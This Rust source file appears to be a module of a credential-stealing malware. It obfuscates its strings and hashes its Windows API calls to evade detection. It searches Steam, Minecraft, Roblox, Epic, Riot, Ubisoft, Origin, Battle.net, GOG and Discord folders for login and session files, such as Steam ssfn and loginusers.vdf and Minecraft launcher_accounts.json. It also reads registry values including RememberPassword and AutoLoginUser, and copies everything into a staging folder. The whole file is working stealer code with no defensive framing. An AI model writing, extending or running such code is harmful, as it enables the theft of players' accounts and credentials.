use crate::sprotect;
use crate::api_resolve::HashedAPIs;
use std::fs;
use std::path::PathBuf;
use winapi::um::winreg::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{KEY_READ, REG_SZ};
use winapi::shared::minwindef::DWORD;
use std::ptr;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

struct GamingApp {
    name: String,
    app_paths: Vec<PathBuf>,
    registry_paths: Vec<String>,
    target_files: Vec<String>,
    target_directories: Vec<String>,
}

async fn get_appdata_paths() -> (PathBuf, PathBuf) {
    let home = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let roaming_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Roaming"));
    let local_path = PathBuf::from(&home).join(sprotect!("AppData")).join(sprotect!("Local"));
    (roaming_path, local_path)
}

fn safe_registry_read_string(hkey: *mut std::ffi::c_void, value_name: &str) -> Option<String> {
    let wide_value_name: Vec<u16> = OsStr::new(value_name).encode_wide().chain(std::iter::once(0)).collect();
    let mut buffer_size: DWORD = 0;

    let result = unsafe {
        HashedAPIs::reg_query_value_ex_w(
            hkey,
            wide_value_name.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            &mut buffer_size,
        )
    };

    if result != 0 || buffer_size == 0 {
        return None;
    }

    let mut buffer: Vec<u16> = vec![0; (buffer_size / 2) as usize];
    let mut actual_size = buffer_size;
    let mut value_type: DWORD = 0;

    let result = unsafe {
        HashedAPIs::reg_query_value_ex_w(
            hkey,
            wide_value_name.as_ptr(),
            ptr::null_mut(),
            &mut value_type,
            buffer.as_mut_ptr() as *mut u8,
            &mut actual_size,
        )
    };

    if result != 0 {
        return None;
    }

    match String::from_utf16(&buffer[..((actual_size / 2) as usize)]) {
        Ok(mut string_value) => {
            if string_value.ends_with('\0') {
                string_value.pop();
            }
            Some(string_value)
        }
        Err(_) => None,
    }
}

fn safe_registry_open(hkey: winapi::shared::minwindef::HKEY, subkey: &str) -> Option<*mut std::ffi::c_void> {
    let wide_subkey: Vec<u16> = OsStr::new(subkey).encode_wide().chain(std::iter::once(0)).collect();
    let mut result_key: *mut std::ffi::c_void = ptr::null_mut();

    let result = unsafe {
        HashedAPIs::reg_open_key_ex_w(
            hkey as *mut _,
            wide_subkey.as_ptr(),
            0,
            KEY_READ,
            &mut result_key,
        )
    };

    if result == 0 {
        Some(result_key)
    } else {
        None
    }
}

async fn get_gaming_apps() -> Vec<GamingApp> {
    let (roaming_path, local_path) = get_appdata_paths().await;
    let mut apps = Vec::new();

    let program_files = PathBuf::from(sprotect!("C:\\Program Files"));
    let program_files_x86 = PathBuf::from(sprotect!("C:\\Program Files (x86)"));

    apps.push(GamingApp {
        name: sprotect!("Steam").to_string(),
        app_paths: vec![
            program_files_x86.join(sprotect!("Steam")),
            program_files.join(sprotect!("Steam")),
        ],
        registry_paths: vec![sprotect!("SOFTWARE\\Valve\\Steam").to_string()],
        target_files: vec![
            sprotect!("*.vdf").to_string(),
            sprotect!("ssfn*").to_string(),
            sprotect!("config.vdf").to_string(),
            sprotect!("loginusers.vdf").to_string(),
        ],
        target_directories: vec![
            sprotect!("config").to_string(),
            sprotect!("userdata").to_string(),
        ],
    });

    apps.push(GamingApp {
        name: sprotect!("Minecraft").to_string(),
        app_paths: vec![roaming_path.join(sprotect!(".minecraft"))],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("launcher_profiles.json").to_string(),
            sprotect!("launcher_accounts.json").to_string(),
            sprotect!("*.json").to_string(),
        ],
        target_directories: vec![sprotect!("saves").to_string()],
    });

    apps.push(GamingApp {
        name: sprotect!("Roblox").to_string(),
        app_paths: vec![local_path.join(sprotect!("Roblox"))],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.rbxl").to_string(),
            sprotect!("*.xml").to_string(),
            sprotect!("GlobalSettings_13.xml").to_string(),
        ],
        target_directories: vec![
            sprotect!("logs").to_string(),
            sprotect!("http").to_string(),
        ],
    });

    apps.push(GamingApp {
        name: sprotect!("EpicGames").to_string(),
        app_paths: vec![
            local_path.join(sprotect!("EpicGamesLauncher")),
            roaming_path.join(sprotect!("Epic")),
        ],
        registry_paths: vec![sprotect!("SOFTWARE\\Epic Games\\EOS").to_string()],
        target_files: vec![
            sprotect!("*.dat").to_string(),
            sprotect!("*.json").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![
            sprotect!("Saved").to_string(),
            sprotect!("Data").to_string(),
        ],
    });

    apps.push(GamingApp {
        name: sprotect!("RiotGames").to_string(),
        app_paths: vec![
            local_path.join(sprotect!("Riot Games")),
            roaming_path.join(sprotect!("Riot Games")),
        ],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.yaml").to_string(),
            sprotect!("*.yml").to_string(),
            sprotect!("*.json").to_string(),
        ],
        target_directories: vec![
            sprotect!("RiotClientInstalls.json").to_string(),
            sprotect!("Data").to_string(),
        ],
    });

    apps.push(GamingApp {
        name: sprotect!("Uplay").to_string(),
        app_paths: vec![
            program_files_x86.join(sprotect!("Ubisoft")),
            local_path.join(sprotect!("Ubisoft Game Launcher")),
        ],
        registry_paths: vec![sprotect!("SOFTWARE\\Ubisoft\\Launcher").to_string()],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.json").to_string(),
        ],
        target_directories: vec![
            sprotect!("cache").to_string(),
            sprotect!("settings").to_string(),
        ],
    });

    apps.push(GamingApp {
        name: sprotect!("Origin").to_string(),
        app_paths: vec![
            roaming_path.join(sprotect!("Origin")),
            local_path.join(sprotect!("Origin")),
        ],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("local.xml").to_string(),
        ],
        target_directories: vec![sprotect!("LocalContent").to_string()],
    });

    apps.push(GamingApp {
        name: sprotect!("BattleNet").to_string(),
        app_paths: vec![
            roaming_path.join(sprotect!("Battle.net")),
            local_path.join(sprotect!("Blizzard Entertainment")),
        ],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.config").to_string(),
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
        ],
        target_directories: vec![sprotect!("Logs").to_string()],
    });

    apps.push(GamingApp {
        name: sprotect!("GOG").to_string(),
        app_paths: vec![
            local_path.join(sprotect!("GOG.com")),
            roaming_path.join(sprotect!("GOG.com")),
        ],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.db").to_string(),
            sprotect!("*.sqlite").to_string(),
            sprotect!("*.json").to_string(),
        ],
        target_directories: vec![sprotect!("Galaxy").to_string()],
    });

    apps.push(GamingApp {
        name: sprotect!("Discord_RPC").to_string(),
        app_paths: vec![local_path.join(sprotect!("DiscordGames"))],
        registry_paths: vec![],
        target_files: vec![
            sprotect!("*.json").to_string(),
            sprotect!("*.log").to_string(),
        ],
        target_directories: vec![sprotect!("*").to_string()],
    });

    apps
}

async fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf) -> bool {
    if src.exists() && src.is_file() {
        if let Some(filename) = src.file_name() {
            let dest_path = dest_dir.join(filename);
            if let Some(parent) = dest_path.parent() {
                fs::create_dir_all(parent).ok();
            }
            fs::copy(src, dest_path).is_ok()
        } else {
            false
        }
    } else {
        false
    }
}

async fn copy_directory_if_exists(src: &PathBuf, dest: &PathBuf) -> bool {
    if src.exists() && src.is_dir() {
        copy_directory_recursive(src, dest)
    } else {
        false
    }
}

fn copy_directory_recursive(src: &PathBuf, dest: &PathBuf) -> bool {
    if fs::create_dir_all(dest).is_err() {
        return false;
    }

    if let Ok(entries) = fs::read_dir(src) {
        for entry in entries.flatten() {
            let src_path = entry.path();
            let dest_path = dest.join(entry.file_name());

            if src_path.is_dir() {
                copy_directory_recursive(&src_path, &dest_path);
            } else {
                fs::copy(&src_path, &dest_path).ok();
            }
        }
        true
    } else {
        false
    }
}

fn find_pattern_files(dir: &PathBuf, pattern: &str) -> Vec<PathBuf> {
    let mut files = Vec::new();
    if !dir.exists() {
        return files;
    }

    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_file() {
                if let Some(filename) = path.file_name() {
                    if let Some(filename_str) = filename.to_str() {
                        if pattern_matches(filename_str, pattern) {
                            files.push(path);
                        }
                    }
                }
            } else if path.is_dir() {
                let mut subfiles = find_pattern_files(&path, pattern);
                files.append(&mut subfiles);
            }
        }
    }
    files
}

fn pattern_matches(filename: &str, pattern: &str) -> bool {
    if pattern == sprotect!("*") {
        return true;
    }
    if pattern.starts_with(sprotect!("*").as_str()) && pattern.ends_with(sprotect!("*").as_str()) {
        let middle = &pattern[1..pattern.len()-1];
        return filename.contains(middle);
    }
    if pattern.starts_with(sprotect!("*").as_str()) {
        let suffix = &pattern[1..];
        return filename.ends_with(suffix);
    }
    if pattern.ends_with(sprotect!("*").as_str()) {
        let prefix = &pattern[..pattern.len()-1];
        return filename.starts_with(prefix);
    }
    filename == pattern
}

async fn extract_registry_data(app: &GamingApp, app_output_dir: &PathBuf) -> bool {
    let mut found_data = false;
    
    for registry_path in &app.registry_paths {
        if let Some(hkey) = safe_registry_open(HKEY_CURRENT_USER, registry_path) {
            let registry_file = app_output_dir.join(sprotect!("registry_data.txt"));
            let mut registry_content = String::new();
            
            let values_to_check = vec![
                sprotect!("InstallPath"),
                sprotect!("SteamPath"),
                sprotect!("SourceModInstallPath"),
                sprotect!("SteamExe"),
                sprotect!("InstallConfigStore"),
                sprotect!("Language"),
                sprotect!("RunningAppID"),
                sprotect!("RememberPassword"),
                sprotect!("AutoLoginUser"),
                sprotect!("LastGameNameUsed"),
            ];
            
            for value_name in values_to_check {
                if let Some(value) = safe_registry_read_string(hkey, &value_name) {
                    registry_content.push_str(&format!("{}={}\n", value_name, value));
                    found_data = true;
                }
            }
            
            if !registry_content.is_empty() {
                fs::write(registry_file, registry_content).ok();
            }
            
            unsafe {
                HashedAPIs::reg_close_key(hkey);
            }
        }
    }
    
    found_data
}

pub async fn extract_gaming_apps() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\apps"));
    let apps = get_gaming_apps().await;

    for app in apps {
        let app_output_dir = base_output.join(&app.name);
        fs::create_dir_all(&app_output_dir).ok();

        let mut found_data = false;

        for app_path in &app.app_paths {
            if !app_path.exists() {
                continue;
            }

            for target_file in &app.target_files {
                let files = find_pattern_files(&app_path, target_file);
                for file in files {
                    if copy_file_if_exists(&file, &app_output_dir).await {
                        found_data = true;
                    }
                }
            }

            for target_dir in &app.target_directories {
                if target_dir == &sprotect!("*") {
                    if copy_directory_if_exists(&app_path, &app_output_dir.join(app_path.file_name().unwrap_or_default())).await {
                        found_data = true;
                    }
                } else {
                    let full_target_path = app_path.join(target_dir);
                    if copy_directory_if_exists(&full_target_path, &app_output_dir.join(target_dir)).await {
                        found_data = true;
                    }
                }
            }
        }

        if extract_registry_data(&app, &app_output_dir).await {
            found_data = true;
        }

        if !found_data {
            fs::remove_dir_all(&app_output_dir).ok();
        }
    }

    Ok(())
}